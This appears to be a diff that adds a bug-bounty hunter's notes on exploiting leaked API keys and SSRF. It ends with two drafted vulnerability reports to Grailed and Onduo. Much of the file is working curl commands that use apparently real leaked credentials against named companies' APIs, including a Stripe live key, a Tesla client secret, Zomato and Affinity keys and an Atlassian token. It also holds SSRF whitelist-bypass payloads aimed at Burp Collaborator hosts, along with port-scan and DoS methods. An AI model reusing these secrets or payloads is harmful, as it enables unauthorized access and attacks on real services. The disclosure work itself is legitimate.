@@ -1,0 +1,525 @@
+
+
+API Exploit :
+
+Why ?
+Keys , Tokens, Access keys etc 
+
+IMP:
+1. Not every key is a issue
+2. Without exploit do not report anything
+
+Doc reading
+1. API Docs
+
+1.1 Target based 
+
+Samsung.com
+SELF APIs
+github
+
+1.2 Service based 
+agri10x.com  
+razor pay
+Amazon
+Google cloud
+
+Zomato 
+Walmart
+
+Mostly relayed on Third Party / Service based 
+
+2. Postman dork 
+https://documenter.getpostman.com/view/ "tesla"
+
+
+Commands :
+cURL usage as per API DOCS
+
+
+
+How to API docs ?
+target api docs curl
+
+zomato api docs curl
+tesla api docs curl
+uber api docs curl
+
+Find api token in uber.com
+
+"uber.com" api token
+gfdsahfdsagduysagjxhvkdfbvkj
+"uber.com" api_token
+"uber.com" api 
+
+
+curl "https://api.uber.com/v1/partners/trips" -H "Authorization: gfdsahfdsagduysagjxhvkdfbvkj"
+
+
+curl -X "GET" ^
+  "https://developers.zomato.com/api/v2.1/cities?city_ids=260" ^
+  -H "accept: application/json" ^
+  -H "user-key: db5cc0c3fa8e6679c4f19aeb201c1c0c"
+
+
+  https://developer.api.stg.walmart.com/api-proxy/service/affiliates/og-api/v1/grocery/feeds/items/price-availability/deltas
+
+  curl -X POST -H \\\"Cache-Control: no-cache\\\" -H \\\"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\\\" -F \\\"grant_type=password\\\" -F \\\"client_id=81527cff06843c8634fdc09e8ac0abefb46ac849f38fe1e431c2ef2106796384\\\" -F \\\"client_secret=c7257eb71a564034f9419ee651c7d0e5f7aa6bfbd18bafb5c5c033b093bb2fa3\\\" -F \\\"email=admin\\\" -F \\\"password=admin\\\" \\\"https://owner-api.teslamotors.com/oauth/token\\\""
+
+
+  1. Wayback : grailed.com/api/config
+  2. Search Key: Filepicker 
+  3. Filepicker API docs
+  4. 
+
+  "filepicker_conversion_url":"https://process.fs.grailed.com","filepicker_key":"AJdAgnqCST4iPtnUxiGtTz"
+
+  curl -X POST -d url="https://robbreport.com/wp-content/uploads/2016/10/02-lykan-hypersport-lux-black-w-motors-041.jpg" "https://process.fs.grailed.com/api/store/S3?key=AJdAgnqCST4iPtnUxiGtTz"
+
+
+  curl "https://api.affinity.co/organizations?term=affinity" -u :j4kjy1CyQWhdXRxr7pIZqOj65mMJ6IRQFPsCVOzaNPI
+
+
+
+  curl --header "X-Zomato-API-Key:7749b19667964b87a3efc739e254ada2" "https://api.zomato.com/v1/search.json?city_id=1"
+
+
+  "zomato.com" api_key:
+
+  "affinity.co" key : khsadfgkhdsfksdbfkhdsbfkdshbkhbsdkhb
+
+
+  curl -X GET -H "Content-Type: application/json" -H "Authorization: eyJwYXJhbXMiOnsidGVybSI6ImFkbWluIiwid2l0aF9pbnRlcmFjdGlvbl9kYXRlcyI6ZmFsc2UsIndpdGhfaW50ZXJhY3Rpb25fcGVyc29ucyI6ZmFsc2UsIndpdGhfb3Bwb3J0dW5pdGllcyI6ZmFsc2V9LCJwYWdlX3NpemUiOjUwMCwib2Zmc2V0Ijo1MDB9)" https://containeranalysis.googleapis.com/v1beta1/projects/my_project/occurrences?filter=kind%3D%22VULNERABILITY%22%20AND%20resourceUrl%3D%22https%3A//us.gcr.io/my_project/tabulate%40sha256%3Ahash%22?PageToken=%22token_number%22
+
+
+API exploits 
+
+1. exploit first then report
+2. not every key you can exploit
+3. Reading docs is important 
+4. Diff betn sensetive data
+
+
+
+Reading Docs
+1. Company based
+2. Service Based
+
+
+1. Twillio
+2. Hipchat
+3. Zendesk
+4. Tesla
+
+
+Twillio API DOCS curl
+
+Target: grailed >
+
+
+"filepicker_conversion_url":"https://process.fs.grailed.com","filepicker_key":"AJdAgnqCST4iPtnUxiGtTz"
+
+curl -X POST \
+    -d url="https://events.eurid.eu/media/upload/tedex_2012-2788.jpg" \
+    "https://process.fs.grailed.com/api/store/S3?key=AJdAgnqCST4iPtnUxiGtTz"
+
+
+display_name":"Admin User","description":"This user is a Grailed Admin."}],"stripe_publishable_key":"pk_live_51Jm0mwCQkFi8IKk8Eunrm30ZgVokGlnbINVg7J61t75KrDhUHRQA9qrPYqVAI6ggd9Kiwy5aIXJLaQO1a1mmgTBy00oYFIrhOU"
+
+
+curl https://api.stripe.com/v1/charges -u pk_live_51Jm0mwCQkFi8IKk8Eunrm30ZgVokGlnbINVg7J61t75KrDhUHRQA9qrPYqVAI6ggd9Kiwy5aIXJLaQO1a1mmgTBy00oYFIrhOU:
+
+
+curl --header "X-Zomato-API-Key:7749b19667964b87a3efc739e254ada2" "https://api.zomato.com/v1/search.json?city_id=1"
+
+curl -X GET --header "Accept: application/json" --header "user-key:" "https://developers.zomato.com/api/v2.1/restaurant?res_id=ccd"
+
+curl -X GET --header "Accept: application/json" --header "user-key: 6aebfe02b9c7820ae965ccf5769fea39" "https://developers.zomato.com/api/v2.1/restaurant?res_id=1"
+
+Consumer Key (API Key)	FWT9xMkLEO5Z1YzeN1JPTySYB
+Consumer Secret (API Secret)	XYDMz5u962gzdCaZARSCyxwgqMq3YT2guSLO0KZPTz0nXuLPJz
+
+
+curl "https://api.affinity.co/users" -u :j4kjy1CyQWhdXRxr7pIZqOj65mMJ6IRQFPsCVOzaNPI
+
+curl "https://api.affinity.co/organizations?term=affinity" -u :j4kjy1CyQWhdXRxr7pIZqOj65mMJ6IRQFPsCVOzaNPI
+
+
+curl "https://api.affinity.co/lists" -u:j4kjy1CyQWhdXRxr7pIZqOj65mMJ6IRQFPsCVOzaNPI
+
+
+SSRF:
+
+CS = SS
+
+
+HTTP
+
+
+Where we can find ?
+
+
+1. Add link
+2. URL parameters
+3. Register process : name , last name SSRF
+4. Inser URL
+5. File Upload 
+6. Header  : Extension : Burp Collaborator Everywhere
+
+
+Exploits:
+
+1. Basic SSRF Detection
+2. Backendmachine scan
+3. Port Scan
+4. SSRF to DoS
+5. Whitelist SSRF bypass
+6. AWS credentials Access
+7. SSRF to Information Disclosure 
+8. SSRF to file fetch on port 
+
+Final OutPut: Information disclosure , Diff betn open and closed ports, DoS and so on
+
+
+
+HTTP
+
+
+Where we can find ?
+
+
+1. Add link
+2. URL parameters
+3. Register process : name , last name SSRF
+4. Inser URL
+5. File Upload 
+6. Header 
+
+
+EXT : Third Party : AWS , GCP , EC2 , DO
+INT : Internal Network , Internal machines , Side Network
+Exploits:
+
+1. Basic SSRF Detection
+Burp collaborator
+
+2. Backendmachine scan
+
+Detection
+IP : Collaborator
+
+45.38.12.1-255
+
+3. Port Scan
+80,8080,25,22,443,8443,8000,3306
+
+OPEN      : 80,25
+CLOSED    : 22,21
+
+Filtered  : 8080,22,443,8443,8000,3306
+HTTP
+DNS
+Nothing :
+
+
+
+Forced server to make on interaction closed / open ports : Dos
+
+
+
+4. SSRF to DoS
+65,535
+
+Intruder : 2000 Ports
+Which one is open/closed
+5. Whitelist SSRF bypass
+
+/cdn-cgi/
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://farm1.staticflickr.com@b9l1p60rpi8db68ysxpg47jw0n6du2.burpcollaborator.net/49/153920045_4dca9b1b03.jpg
+
+Payload to bypass
+@
+.
+#
+
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://b9l1p60rpi8db68ysxpg47jw0n6du2.burpcollaborator.net/49/153920045_4dca9b1b03.jpg
+
+
+
+6. AWS credentials Access
+7. SSRF to Information Disclosure 
+8. SSRF to file fetch on port 
+
+Final OutPut: Information disclosure , Diff betn open and closed ports, DoS and so on
+
+
+IMP:
+1. Not every HTTP interaction is SSRF
+2. Check IP belongs to whom
+3. DNS interaction is 99% useless
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+1. Detection
+2. Exploit : Diffrence betn open closed ports
+3. Backend System :
+
+
+IP: 
+199.102.234.1
+.
+.
+.
+
+199.102.234.97
+199.102.234.98
+199.102.234.99
+199.102.234.100
+199.102.234.255
+
+
+
+
+192.168.0.1
+192.168.0.2
+192.168.0.3
+192.168.0.4
+
+192.168.0.5
+192.168.0.6
+192.168.0.7
+192.168.0.8
+
+1. Backend Sysytem Scan : 1-255 
+2. Changing protocol : http/https
+3. Added IP:PORT
+4. File fetch over port
+5. burp.net:80/test.php
+
+
+DoS:
+
+5000
+
+
+MasterCard: Dos via  SSRF
+
+65,000
+Closed: 45,000
+Open:   20,000
+
+
+Request POST
+
+adv-uri:"https://burp.net:1/admin.php"
+adv-uri:"https://burp.net:1/admin.aspx"
+adv-uri:"https://burp.net:1/admin.php"
+
+5000 PORTS
+
+1000 OPEN = HTTP DNS SMTP FILT
+4000 CLOSED = 
+3456 PORT = CLOSED 
+
+
+
+Response : HTTP / DNS 
+
+url: burp.net:80/test.php
+
+/
+=
+@
+.
+/
+>
+<
+!
+:
+
+Whitelisting
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://o.quizlet.com.h6oy6tehlghm1bx1lk10um34nvtmhb.burpcollaborator.net/2mS6GlnSu5c-xhCcrC0Qxg.png
+
+
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://o.quizlet.com@h6oy6tehlghm1bx1lk10um34nvtmhb.burpcollaborator.net/2mS6GlnSu5c-xhCcrC0Qxg.png
+
+
+
+
+@
+#
+.
+
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+(1) (2) (3) (4) (5) (6) (7) (8) (9) (10) (11) (12) (13) (14) (15) (16) (17) (18) (19) (20)
+1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20.
+
+
+
+1. SSRF
+burp.net:1-5000/admin.php
+
+
+https://process.fs.grailed.com/AJdAgnqCST4iPtnUxiGtTz/auto_image/cache=expiry:max/rotate=deg:exif/resize=height:320,width:240,fit:crop/output=quality:70/compress/https://cdn.fs.grailed.com.f1hw1r9fgeckw9szgiwypky2itoocd.burpcollaborator.net/api/file/4LZgd6MrS7mN0IDRtyEm
+
+
+
+
+
+
+
+Hello Grailed team,
+
+
+Intro
+I aditya shende found a vuln in of your of sub domain 
+
+
+Title : SSRF leads to port scan + White List bypass possible by special symbols on cdn-cgi enpoint
+
+
+Description:
+Server-side Request Forgery (SSRF) forms part of a class of vulnerabilities known as Out-of-band (OOB) vulnerabilities. Detecting SSRF (and other OOB vulnerabilities) requires the scanner to trick the web application into sending a request to the collborator or your own server . Using SSRF we can induce server to make HTTP requests
+
+Steps:
+
+1. Navigate to URL : https://web.archive.org/cdx/search/cdx?url=*.grailed.com/*&output=text&fl=original&collapse=urlkey
+2. Find for "/cdn-cgi/"
+3. Vulnerable URL: https://process.fs.grailed.com/AJdAgnqCST4iPtnUxiGtTz/auto_image/cache=expiry:max/rotate=deg:exif/resize=height:320,width:240,fit:crop/output=quality:70/compress/https://cdn.fs.grailed.com/api/file/4LZgd6MrS7mN0IDRtyEm
+(There are multiple URLs of cdn-cgi)
+4. Exchange URL of "cdn.fs.grailed.com" with "cgwtgoocvbrhb67wvfbv4hdzxq3mrb.burpcollaborator.net"
+5. Final URL: https://process.fs.grailed.com/AJdAgnqCST4iPtnUxiGtTz/auto_image/cache=expiry:max/rotate=deg:exif/resize=height:320,width:240,fit:crop/output=quality:70/compress/https://cgwtgoocvbrhb67wvfbv4hdzxq3mrb.burpcollaborator.net/api/file/4LZgd6MrS7mN0IDRtyEm
+6. Open URL in any browser (Used browser: Chrome, Firefox: Latest)
+
+Note: We fetched .png file and it sends HTTP request in collborator
+
+Exploit
+1. Send the GET request to proxy tool repeater to perform exploit
+2. https://process.fs.grailed.com/AJdAgnqCST4iPtnUxiGtTz/auto_image/cache=expiry:max/rotate=deg:exif/resize=height:320,width:240,fit:crop/output=quality:70/compress/https://cgwtgoocvbrhb67wvfbv4hdzxq3mrb.burpcollaborator.net:80/api/file/4LZgd6MrS7mN0IDRtyEm | Hit on go > We got HTTP request in collaborator
+3. Exchange port 80 with different ports like 22,80,8080,443,21
+4. If port is open then it will fetch HTTP request in collorator | If port is closed then we won't able fetch request in collaborator
+
+
+Impact:
+As an attacker I am able to perform port scan via GET request and validation bypass using whitelisting method of ssrf which can affectively leads to Origin IP disclosed , Dos , Backend System Scan etc
+
+Solution:
+As solution you can actually blacklisted special symbols like:  @,.,#,/ or make sure that cdn-cgi endpint dont fetch anything from external resources .
+
+
+
+Thanks,
+Aditya Shende
+Red Team Ops, Agri10x
+
+
+
+
+Summary: Atlassian token disclosure and crafting nested queries with internal port scan as SSRF may leads to application level DOS
+
+Steps to reproduce:
+  1.  Use this in cmd:  curl -v https://onduo.com --user admin@onduo.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout
+
+  2. I got this token from burpsuite spidering of onduo.atlassian.net
+
+  3. Now run this curl -v https://onduo.com:22 --user admin@onduo.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout
+
+We can see the time delay on port change 80,8080 giving instant response but 22 port giving late reponse
+
+Browser/OS:  NA/ Firefox
+
+Attack scenario:
+A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.
+
+An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks that appear to originate from the organization hosting the vulnerable application, leading to potential legal liabilities and reputational damage.
+
+When we check command on 80,8080 port it gives speedy response but on port 22 it gives late response . It means 22 closed. If hacker perform this attack like port scan then this may leads to DOS
+
+
+POC: https://drive.google.com/file/d/1jXxCH80e9EwGjHWMGC716iB1Z6l4_xsw/view?usp=sharing
+
+
+Hello team,
+
+As I mentioned in 2nd step that I got token while crawling whole web app or else simple method is that we can check source code on following endpoint-- https://onduollc.atlassian.net/projects
+
+Steps to reproduce issue:
+1. Check source code of  https://onduollc.atlassian.net/projects
+2. Search for "atlassian-token"
+3. Atlassian token can be used for crafting nested queries but I escalated this to SSRF port scan
+4. Syntax for crafting next queries :  curl -v  https://mainhost.com --user anyuser@target.atlassian.net:atlassian_token_here_lout
+
+Exploit command:
+1. On port 80
+curl -v https://onduo.com:80 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout  
+
+It crafted queries and gives us valid response , We can say instant response 
+image.png
+
+2. On port 22
+curl -v https://onduo.com:22 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout  
+It gave me response after 1 min 45 seconds :" failed to connect on port 22"
+image.png
+
+3. On port 443 
+curl -v https://onduo.com:443 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout  
+It gave me response which was instant with crafted queries
+
+PORT443.gif
+
+An interesting part is when I change the host on port which we check
+
+Command is curl -v https://enroll.onduo.com:443 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout   
+
+it gave me following information :
+
+__FIREBASE_API_KEY__ = 'AIzaSyCq7ZPizDqVfo0D8y8fTfHIDqJ5Qq7FvFc'; __FIREBASE_PROJECT_ID__ = 'diabetes-management'; __FIREBASE_AUTH_DOMAIN__ = 'diabetes-management.firebaseapp.com'; __FIREBASE_DATABASE_URL__ = 'https:\/\/diabetes-management.firebaseio.com'; __FIREBASE_STORAGE_BUCKET__ = 'diabetes-management.appspot.com'; __FIREBASE_MESSAGING_SENDER_ID__ = '719737211384'
+
+Also I tried same command with port 3306 it takes a long time
+
+
+
+Impact: The first part is , It gives instant response on open port and when I try with closed port like 3306,22 it takes long to craft queries
+
+So If hacker try same attacks on closed ports so the command will force a server to craft queries because of a closed port it's not going to craft it . Performing same attack on closed ports to craft queries will make server engage and this may leads to DOS attack. 
+
+Changing host enroll.onduo.com with port 443 to perform SSRF was giving sensitive information about firebase stuff 
+
+If you've any queries feel free to ask 
+
+
+
+
+Thank you,
+Aditya Shende
+
